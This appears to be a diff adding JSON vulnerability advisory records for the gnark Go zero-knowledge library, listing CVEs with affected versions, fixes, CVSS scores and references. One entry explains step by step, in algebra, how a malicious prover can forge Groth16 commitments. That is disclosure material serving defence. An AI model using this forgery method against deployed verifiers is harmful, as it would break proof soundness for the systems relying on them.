+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/10/GHSA-cph5-3pgr-c82g/GHSA-cph5-3pgr-c82g.json",
+      "last_known_affected_version_range": "<= 0.11.0"
+     }
+    }
+   ],
+   "schema_version": "1.9.0",
+   "severity": [
+    {
+     "type": "CVSS_V3",
+     "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
+    },
+    {
+     "type": "CVSS_V4",
+     "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+    }
+   ]
+  },
+  {
+   "id": "GHSA-q3hw-3gm4-w5cr",
+   "summary": "gnark's Groth16 commitment extension unsound for more than one commitment",
+   "details": "### Description\n\nThe summary is that the proof of knowledge associated to a commitment is crucial to bind the commitment to the actual circuit variables that were supposed to be committed. However, the same \u03c3 is used for all proofs of knowledge for the commitments, which allows mixing between them, making it possible to fix the value of all but one commitment before choosing the circuit variable assignments.\n\nIn more detail:\nTo simplify notation, let us consider the case of two commitments, each to only a single variable. Let's say the basis elements for those commitments are `K_0` and `K_1`. Then the proving key will contain `K_0` and `K_1`, and also `\u03c3*K_0` and `\u03c3*K_1` for the proof of knowledge. The honest prover assigning a to the first circuit variable and b to the second will then produce commitments\n`D_0 = a*K_0`\n`D_1 = b*K_1`\nOut of the two D's, a challenge r for the commitment folding will be generated. The folded commitment will then be\n`D_folded = D_0 + r*D_1 = a*K_0 + r*b*K_1`\nThe honest prover will supply a fitting proof of knowledge\n`P = a*(\u03c3*K_0) + r*b*(\u03c3*K_1)`\n\nNow the verifier will only use all of this in two ways:\n1. In the check of the Groth16 proof itself, where only the sum `D_0 + D_1` is used.\n2. In the proof of knowledge check, where it will be verified that P is indeed `\u03c3*(D_0 + r*D_1)`, with r calculated from `D_0` and `D_1` as before.\n\nThis has the following implications. In the following, a malicious prover's points will have an apostrophe appended, and we keep `D_0` etc. for the legitimate values:\n1. A malicious prover is only forced to provide `D'_0` and `D'_1` such that the sum is correct. So they can use arbitrary `D'_0` as long as they set `D'_1 = D_0 + D_1 - D'_0`.\n2. After choosing `D'_0` and `D'_1`, the prover can always calculate r. Evaluating `\u03c3*(D'_0 + r*D'_1)` is then possible as long as both `D'_0` and `D'_1` are linear combinations of basis elements for which \u03c3 times that basis element is known. In particular, this works as long as `D'_0` and `D'_1` are linear combinations of `K_0` and `K_1`.\n\nThe upshot is that a malicious prover can choose arbitrary a' and b', and then set\n`D'_0 = a'*K_0 + b'*K_1`\n`D'_1 = (a - a')*K_0 + (b - b')*K_1`\nThen they calculate r for this, and set\n`P = (a' + r*(a-a'))*(\u03c3*K_0) + (b' + r*(b-b'))*(\u03c3*K_1)`\nThis will then be accepted as a valid proof. Yet the first commitment point can be chosen completely independently of a and b, so in particular the malicious prover can use a constant for this, so that they will know the in-circuit challenge that will be added to the public inputs before they have to choose the witness assignments. For most use cases of such challenges (for proving things with Fiat-Shamir, random linear combinations etc.) this causes a critical soundness problem.\n\nThe problem generalizes to more than two commitments and commitments to more than one circuit variable each; one can freely choose all but one commitment as arbitrary linear combinations of the basis elements for all commitments, and then must choose the one remaining commitment in such a way that the sum is correct.\n\nThe root cause of the issue is that the \u03c3 used for the proofs of knowledge is the same, allowing to mix between the basis elements, as one has \u03c3 times them available for all of them.\nSo the fix is to have a separate \u03c3 for each commitment. So in our example above, the proving key would have the basis elements `K_0` and `K_1`, and for the proofs of knowledge now `\u03c3_0*K_0` and `\u03c3_1*K_1`. Folding the commitments would not be possible in the same way now, so the verifier will have to do more pairings. The prover could still provide a folded proof of knowledge however. With\n`D_0 = a*K_0`\n`D_1 = b*K_1`\nthe proof of knowledge would be\n`P = a*(\u03c3_0*K_0) + r*b*(\u03c3_1*K_1)`\nFor later, let us use notation for the unfolded proofs of knowledge\n`P_0 = a*(\u03c3_0*K_0)`\n`P_1 = b*(\u03c3_1*K_1)`\nso that\n`P = P_0 + r*P_1`\n\nThe verifying key would need `G` and `\u03c3_0*G` and `\u03c3_1*G`. To check the two unfolded proofs of knowledge would be the checks\n`e(P_0, G) = e(D_0, \u03c3_0*G)`\n`e(P_1, G) = e(D_1, \u03c3_1*G)`\nAs r is a challenge derived from D_0 and D_1, we may instead check\n`e(P_0, G) + r*e(P_1, G) = e(D_0, \u03c3_0*G) + r*e(D_1, \u03c3_1*G)`\nThe left hand side is\n`e(P_0, G) + r*e(P_1, G) = e(P_0 + r*P_1, G) = e(P, G)`\nSo the prover can just provide P and then the verifier checks\n`e(P, G) = e(D_0, \u03c3_0*G) + r*e(D_1, \u03c3_1*G)`\nUnfortunately, the right hand side can't be folded as before, as there isn't a side of the pairing that is kept constant between the pairings as before. So the verifier will need to have a pairing for each commitment on the right hand side.\n\n### Impact\n\nIt is a soundness issue - in case of multiple commitments used inside the circuit the prover is able to choose all but the last commitment. As we use the commitments for optimized non-native multiplication, lookup checks etc. as random challenges, then it could impact the soundness of the whole circuit.\n\nHowever, using multiple commitments has been discouraged due to the additional cost to the verifier and it has not been supported in the recursive in-circuit Groth16 verifier and Solidity verifier. So we expect the impact of the issue be very small - only for the users who have implemented the native Groth16 verifier or are using it with multiple commitments. We do not have information of such users.\n\n### Patches\n\nThe issue has been patched in e7c66b000454f4d2a4ae48c005c34154d4cfc2a2\n\n### Workarounds\n\nThe recommendation has been to use only a single commitment and then derive in-circuit commitments as needed using [std/multicommit](https://pkg.go.dev/github.com/consensys/gnark/std/multicommit) package.\n\n### References\n\nSee the correspondence above.\n",
+   "aliases": [
+    "CVE-2024-45039",
+    "GO-2024-3122"
+   ],
+   "modified": "2024-11-20T19:26:02Z",
+   "published": "2024-09-06T19:53:20Z",
+   "database_specific": {
+    "github_reviewed_at": "2024-09-06T19:53:20Z",
+    "nvd_published_at": "2024-09-06T13:15:04Z",
+    "cwe_ids": [
+     "CWE-200"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true
+   },
+   "references": [
+    {
+     "type": "WEB",
+     "url": "https://github.com/Consensys/gnark/security/advisories/GHSA-q3hw-3gm4-w5cr"
+    },
+    {
+     "type": "ADVISORY",
+     "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-45039"
+    },
+    {
+     "type": "WEB",
+     "url": "https://github.com/Consensys/gnark/commit/e7c66b000454f4d2a4ae48c005c34154d4cfc2a2"
+    },
+    {
+     "type": "PACKAGE",
+     "url": "https://github.com/Consensys/gnark"
+    },
+    {
+     "type": "WEB",
+     "url": "https://pkg.go.dev/vuln/GO-2024-3122"
+    }
+   ],
+   "affected": [
+    {
+     "package": {
+      "name": "github.com/consensys/gnark",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/consensys/gnark"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "fixed": "0.11.0"
+        }
+       ]
+      }
+     ],
+     "database_specific": {
+      "last_known_affected_version_range": "<= 0.10.0",
+      "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-q3hw-3gm4-w5cr/GHSA-q3hw-3gm4-w5cr.json"
+     }
+    }
+   ],
+   "schema_version": "1.9.0",
+   "severity": [
+    {
+     "type": "CVSS_V3",
+     "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"
+    }
+   ]
+  },
+  {
+   "id": "GO-2024-3122",
+   "summary": "Groth16 commitment extension unsound for more than one commitment in github.com/consensys/gnark",
+   "details": "Groth16 commitment extension unsound for more than one commitment in github.com/consensys/gnark",
+   "aliases": [
+    "CVE-2024-45039",
+    "GHSA-q3hw-3gm4-w5cr"
+   ],
+   "modified": "2026-03-03T04:55:47.909022Z",
+   "published": "2024-11-20T17:22:48Z",
+   "database_specific": {
+    "review_status": "REVIEWED",
+    "url": "https://pkg.go.dev/vuln/GO-2024-3122"
+   },
+   "references": [
+    {
+     "type": "ADVISORY",
+     "url": "https://github.com/Consensys/gnark/security/advisories/GHSA-q3hw-3gm4-w5cr"
+    }
+   ],
+   "affected": [
+    {
+     "package": {
+      "name": "github.com/consensys/gnark",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/consensys/gnark"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "fixed": "0.11.0"
+        }
+       ]
+      }
+     ],
+     "ecosystem_specific": {},
+     "database_specific": {
+      "source": "https://vuln.go.dev/ID/GO-2024-3122.json"
+     }
+    }
+   ],
+   "schema_version": "1.7.3"
+  },
+  {
+   "id": "GO-2024-3123",
+   "summary": "Commitments to private witnesses in Groth16 as implemented break zero-knowledge property in github.com/consensys/gnark",
+   "details": "Commitments to private witnesses in Groth16 as implemented break zero-knowledge property in github.com/consensys/gnark",
+   "aliases": [
+    "CVE-2024-45040",
+    "GHSA-9xcg-3q8v-7fq6"
+   ],
+   "modified": "2024-09-13T22:27:41.433242Z",
+   "published": "2024-09-13T21:55:09Z",
+   "database_specific": {
+    "url": "https://pkg.go.dev/vuln/GO-2024-3123",
+    "review_status": "REVIEWED"
+   },
+   "references": [
+    {
+     "type": "ADVISORY",
+     "url": "https://github.com/Consensys/gnark/security/advisories/GHSA-9xcg-3q8v-7fq6"
+    },
+    {
+     "type": "FIX",
+     "url": "https://github.com/Consensys/gnark/commit/afda68a38acca37becb8ba6d8982d03fee9559a0"
+    },
+    {
+     "type": "FIX",
+     "url": "https://github.com/Consensys/gnark/pull/1245"
+    }
+   ],
+   "affected": [
+    {
+     "package": {
+      "name": "github.com/consensys/gnark",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/consensys/gnark"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "fixed": "0.11.0"
+        }
+       ]
+      }
+     ],
+     "ecosystem_specific": {
+      "imports": [
+       {
+        "path": "github.com/consensys/gnark/constraint/solver",
+        "symbols": [
+         "RegisterHint"
+        ]
+       },
+       {
+        "path": "github.com/consensys/gnark/frontend/cs/r1cs",
+        "symbols": [
+         "builder.Commit"
+        ]
+       }
+      ]
+     },
+     "database_specific": {
+      "source": "https://vuln.go.dev/ID/GO-2024-3123.json"
+     }
+    }
+   ],
+   "schema_version": "1.7.3"
+  },
+  {
+   "id": "GO-2024-3244",
+   "summary": "Gnark out-of-memory during deserialization with crafted inputs in github.com/consensys/gnark",
+   "details": "Gnark out-of-memory during deserialization with crafted inputs in github.com/consensys/gnark",
+   "aliases": [
+    "CVE-2024-50354",
+    "GHSA-cph5-3pgr-c82g"
+   ],
+   "modified": "2025-02-06T17:50:03Z",
+   "published": "2024-11-01T21:55:10Z",
+   "database_specific": {
+    "review_status": "REVIEWED",
+    "url": "https://pkg.go.dev/vuln/GO-2024-3244"
+   },
+   "references": [
+    {
+     "type": "ADVISORY",
+     "url": "https://github.com/advisories/GHSA-cph5-3pgr-c82g"
+    },
+    {
+     "type": "FIX",
+     "url": "https://github.com/Consensys/gnark/commit/47ae846339add2bdf9983e499342bfdfe195191d"
+    },
+    {
+     "type": "FIX",
+     "url": "https://github.com/Consensys/gnark/pull/1307"
+    }
+   ],
+   "affected": [
+    {
+     "package": {
+      "name": "github.com/consensys/gnark",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/consensys/gnark"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "fixed": "0.12.0"
+        }
+       ]
+      }
+     ],
+     "ecosystem_specific": {
+      "imports": [
+       {
+        "path": "github.com/consensys/gnark/backend/groth16/bls24-315",
+        "symbols": [
+         "ProvingKey.ReadDump",
+         "ProvingKey.ReadFrom",
+         "ProvingKey.UnsafeReadFrom",
+         "ProvingKey.readFrom",
+         "Setup",
+         "VerifyingKey.ReadFrom",
+         "VerifyingKey.UnsafeReadFrom",
+         "VerifyingKey.readFrom"
+        ]
+       },
+       {
+        "path": "github.com/consensys/gnark/backend/groth16/bn254",
+        "symbols": [
+         "ProvingKey.ReadDump",
+         "ProvingKey.ReadFrom",
+         "ProvingKey.UnsafeReadFrom",
+         "ProvingKey.readFrom",
+         "Setup",
+         "VerifyingKey.ReadFrom",
+         "VerifyingKey.UnsafeReadFrom",
+         "VerifyingKey.readFrom"
+        ]
+       },
+       {
+        "path": "github.com/consensys/gnark/backend/groth16/bls24-317",
+        "symbols": [
+         "ProvingKey.ReadDump",
+         "ProvingKey.ReadFrom",
+         "ProvingKey.UnsafeReadFrom",
+         "ProvingKey.readFrom",
+         "Setup",
+         "VerifyingKey.ReadFrom",
+         "VerifyingKey.UnsafeReadFrom",
+         "VerifyingKey.readFrom"
+        ]
+       },
+       {
+        "path": "github.com/consensys/gnark/backend/groth16/bw6-633",
+        "symbols": [
+         "ProvingKey.ReadDump",
+         "ProvingKey.ReadFrom",
+         "ProvingKey.UnsafeReadFrom",
+         "ProvingKey.readFrom",
+         "Setup",
+         "VerifyingKey.ReadFrom",
+         "VerifyingKey.UnsafeReadFrom",
+         "VerifyingKey.readFrom"
+        ]
+       },
+       {
+        "path": "github.com/consensys/gnark/backend/groth16/bls12-381",
+        "symbols": [
+         "ProvingKey.ReadDump",
+         "ProvingKey.ReadFrom",
+         "ProvingKey.UnsafeReadFrom",
+         "ProvingKey.readFrom",
+         "Setup",
+         "VerifyingKey.ReadFrom",
+         "VerifyingKey.UnsafeReadFrom",
+         "VerifyingKey.readFrom"
+        ]
+       },
+       {
+        "symbols": [
+         "ProvingKey.ReadDump",
+         "ProvingKey.ReadFrom",
+         "ProvingKey.UnsafeReadFrom",
+         "ProvingKey.readFrom",
+         "Setup",
+         "VerifyingKey.ReadFrom",
+         "VerifyingKey.UnsafeReadFrom",
+         "VerifyingKey.readFrom"
+        ],
+        "path": "github.com/consensys/gnark/backend/groth16/bls12-377"
+       },
+       {
+        "path": "github.com/consensys/gnark/backend/groth16/bw6-761",
+        "symbols": [
+         "ProvingKey.ReadDump",
+         "ProvingKey.ReadFrom",
+         "ProvingKey.UnsafeReadFrom",
+         "ProvingKey.readFrom",
+         "Setup",
+         "VerifyingKey.ReadFrom",
+         "VerifyingKey.UnsafeReadFrom",
+         "VerifyingKey.readFrom"
+        ]
+       }
+      ]
+     },
+     "database_specific": {
+      "source": "https://vuln.go.dev/ID/GO-2024-3244.json"
+     }
+    }
+   ],
+   "schema_version": "1.7.3",
+   "credits": [
+    {
+     "name": "pventuzelo"
+    }
+   ]
+  },
+  {
+   "id": "GO-2025-3912",
+   "summary": "Gnark is vulnerable to signature malleability in EdDSA and ECDSA due to missing scalar checks in github.com/consensys/gnark",
+   "details": "Gnark is vulnerable to signature malleability in EdDSA and ECDSA due to missing scalar checks in github.com/consensys/gnark",
+   "aliases": [
+    "CVE-2025-57801",
+    "GHSA-95v9-hv42-pwrj"
+   ],
+   "modified": "2026-03-03T04:56:52.514084Z",
+   "published": "2025-08-29T14:52:35Z",
+   "database_specific": {
+    "url": "https://pkg.go.dev/vuln/GO-2025-3912",
+    "review_status": "REVIEWED"
+   },
+   "references": [
+    {
+     "type": "ADVISORY",
+     "url": "https://github.com/Consensys/gnark/security/advisories/GHSA-95v9-hv42-pwrj"
+    },
+    {
+     "type": "FIX",
+     "url": "https://github.com/Consensys/gnark/commit/0ba6730f05537a351517998add89a61a0d82716e"
+    },
+    {
+     "type": "WEB",
+     "url": "https://github.com/Consensys/gnark/commit/0ba6730f05537a351517998add89a61a0d82716e"
+    }
+   ],
+   "affected": [
+    {
+     "package": {
+      "name": "github.com/consensys/gnark",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/consensys/gnark"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "fixed": "0.14.0"
+        }
+       ]
+      }
+     ],
+     "ecosystem_specific": {
+      "imports": [
+       {
+        "path": "github.com/consensys/gnark/std/signature/eddsa",
+        "symbols": [
+         "Verify"
+        ]
+       }
+      ]
+     },
+     "database_specific": {
+      "source": "https://vuln.go.dev/ID/GO-2025-3912.json"
+     }
+    }
+   ],
+   "schema_version": "1.7.3"
+  },
+  {
+   "id": "GO-2025-3929",
+   "summary": "Denial of service when computing scalar multiplication using fake-GLV algorithm in github.com/consensys/gnark",
+   "details": "Denial of service when computing scalar multiplication using fake-GLV algorithm in github.com/consensys/gnark",
+   "aliases": [
+    "CVE-2025-58157",
+    "GHSA-9fvj-xqr2-xwg8"
+   ],
+   "modified": "2026-03-03T04:57:27.659807Z",
+   "published": "2025-09-17T17:03:38Z",
+   "database_specific": {
+    "url": "https://pkg.go.dev/vuln/GO-2025-3929",
+    "review_status": "REVIEWED"
+   },
+   "references": [
+    {
+     "type": "ADVISORY",
+     "url": "https://github.com/Consensys/gnark/security/advisories/GHSA-9fvj-xqr2-xwg8"
+    },
+    {
+     "type": "WEB",
+     "url": "https://github.com/Consensys/gnark-crypto/commit/56600883e0e9f9b159e9c7000b94e76185ec3d0d"
+    },
+    {
+     "type": "WEB",
+     "url": "https://github.com/Consensys/gnark/commit/68be6cede36e387ab760725beabd3c96cc94e6dc"
+    },
+    {
+     "type": "WEB",
+     "url": "https://github.com/Consensys/gnark/issues/1483"
+    }
+   ],
+   "affected": [
+    {
+     "package": {
+      "name": "github.com/consensys/gnark",
+      "ecosystem": "Go",
+      "purl": "pkg:golang/github.com/consensys/gnark"
+     },
+     "ranges": [
+      {
+       "type": "SEMVER",
+       "events": [
+        {
+         "introduced": "0"
+        },
+        {
+         "fixed": "0.13.0"
+        }
+       ]
+      }
+     ],
+     "ecosystem_specific": {},
+     "database_specific": {
+      "source": "https://vuln.go.dev/ID/GO-2025-3929.json"
+     }
+    }
+   ],
+   "schema_version": "1.7.3"
+  }
+ ]
+}
